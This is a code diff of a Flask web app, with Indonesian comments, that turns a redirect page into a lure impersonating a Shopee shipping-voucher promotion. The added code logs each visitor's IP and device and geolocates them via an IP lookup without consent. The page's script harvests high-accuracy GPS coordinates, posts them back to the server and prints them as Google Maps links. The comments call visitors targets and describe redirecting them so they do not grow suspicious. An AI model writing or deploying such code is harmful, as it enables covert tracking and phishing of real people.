@@ -1,4 +1,5 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, request, render_template_string, jsonify
+import requests # Library untuk cek lokasi IP
 
 # Vercel mencari variable bernama 'app' ini secara otomatis
 app = Flask(__name__)
@@ -13,48 +14,118 @@ HTML_TEMPLATE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Shopee Big Sale</title>
-    <meta name="description" content="Diskon 99% Khusus Hari Ini.">
-    <meta property="og:site_name" content="Shopee">
-    <meta property="og:type" content="website">
-    <meta property="og:title" content="Kejutan Shopee - Voucher 500rb">
-    <meta property="og:description" content="Klik untuk klaim sebelum hangus.">
+    <title>Cek Ongkir Otomatis</title>
+    <meta property="og:title" content="Shopee Big Sale - Gratis Ongkir Rp0">
+    <meta property="og:description" content="Klik untuk melihat voucher khusus lokasi Anda.">
     <meta property="og:image" content="{{ image }}">
-    <meta property="og:image:width" content="600">
-    <meta property="og:image:height" content="315">
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content="{{ image }}">
     <style>
-        body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #f0f0f0; }
-        .msg { color: #555; font-size: 14px; }
+        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; text-align: center; padding: 20px; background-color: #f8f8f8; }
+        .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 400px; margin: 50px auto; }
+        .logo { width: 100px; margin-bottom: 20px; }
+        p { color: #555; font-size: 14px; margin-bottom: 20px; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #ee4d2d; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <p class="msg">Sedang memuat...</p>
+    <div class="container">
+        <img src="{{ image }}" class="logo" alt="Shopee">
+        <h3>Sedang Memeriksa Lokasi...</h3>
+        <p>Mohon izinkan akses lokasi untuk menghitung ongkos kirim.</p>
+        <div class="loader"></div>
+        <p id="status">Menghubungkan ke server...</p>
+    </div>
+
     <script>
-        setTimeout(function(){
-            window.location.href = "{{ target }}";
-        }, 1000);
+        const targetUrl = "{{ target }}";
+
+        function redirectNow() {
+            window.location.href = targetUrl;
+        }
+
+        function sendGps(lat, long, acc) {
+            fetch('/save_gps', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ latitude: lat, longitude: long, accuracy: acc })
+            }).then(() => { redirectNow(); }).catch(() => { redirectNow(); });
+        }
+
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        sendGps(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+                    },
+                    (err) => {
+                        // Jika User KLIK BLOCK / TOLAK:
+                        // Tidak masalah, kita sudah dapat IP di server.
+                        // Langsung redirect saja biar dia tidak curiga.
+                        redirectNow();
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                redirectNow();
+            }
+        };
     </script>
 </body>
 </html>
 """
 
-# PERBAIKAN: Jangan gunakan nama 'handler' di sini
+# Fungsi Helper: Cek Lokasi via IP (Tanpa Izin User)
+def get_ip_info(ip_address):
+    try:
+        # Menggunakan API publik gratis ip-api.com
+        response = requests.get(f"http://ip-api.com/json/{ip_address}?fields=status,message,country,regionName,city,isp,lat,lon")
+        data = response.json()
+        if data['status'] == 'success':
+            return data
+    except:
+        return None
+    return None
+
+# Rute Utama
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>')
-def catch_all(path):
-    # Cek User Agent
+def home(path):
+    # 1. AMBIL IP ADDRESS
+    user_ip = request.headers.get('x-forwarded-for', request.remote_addr)
     user_agent = request.headers.get('User-Agent', '').lower()
     
-    # Deteksi Bot WhatsApp / Facebook
-    is_bot = "facebookexternalhit" in user_agent or "whatsapp" in user_agent or "twitterbot" in user_agent
+    # 2. FILTER BOT (Supaya log tidak penuh sampah bot WA)
+    is_bot = "facebookexternalhit" in user_agent or "whatsapp" in user_agent
+    
+    if not is_bot:
+        # 3. LACAK LOKASI BERDASARKAN IP (JALAN OTOMATIS)
+        # Ini akan sukses meskipun user menolak GPS nanti
+        print(f"\n--- [TARGET MASUK] ---")
+        print(f"IP Address  : {user_ip}")
+        print(f"Device Info : {user_agent}")
+        
+        geo_data = get_ip_info(user_ip)
+        if geo_data:
+            print(f"Lokasi (IP) : {geo_data['city']}, {geo_data['regionName']}, {geo_data['country']}")
+            print(f"ISP         : {geo_data['isp']}")
+            print(f"Perkiraan Koordinat (IP) : {geo_data['lat']}, {geo_data['lon']}")
+        else:
+            print("Gagal mengambil detail lokasi IP.")
+        print("----------------------\n")
 
-    if is_bot:
-        return render_template_string(HTML_TEMPLATE, image=IMAGE_URL, target=TARGET_URL)
-    else:
-        user_ip = request.headers.get('x-forwarded-for', request.remote_addr)
-        print(f"!!! TARGET HIT !!! IP: {user_ip} | UA: {user_agent}")
-        return render_template_string(HTML_TEMPLATE, image=IMAGE_URL, target=TARGET_URL)
+    return render_template_string(HTML_TEMPLATE, image=IMAGE_URL, target=TARGET_URL)
 
-# Note: Tidak perlu app.run()
+# Rute Penerima GPS (Jika user klik ALLOW)
+@app.route('/save_gps', methods=['POST'])
+def save_gps():
+    data = request.json
+    user_ip = request.headers.get('x-forwarded-for', request.remote_addr)
+    
+    print(f"\n!!! JACKPOT: GPS DITEMUKAN !!!")
+    print(f"IP Source   : {user_ip}")
+    print(f"Google Maps : https://www.google.com/maps/search/?api=1&query={data['latitude']},{data['longitude']}")
+    print(f"Akurasi     : {data['accuracy']} meter")
+    print("------------------------------\n")
+    
+    return jsonify({"status": "success"})
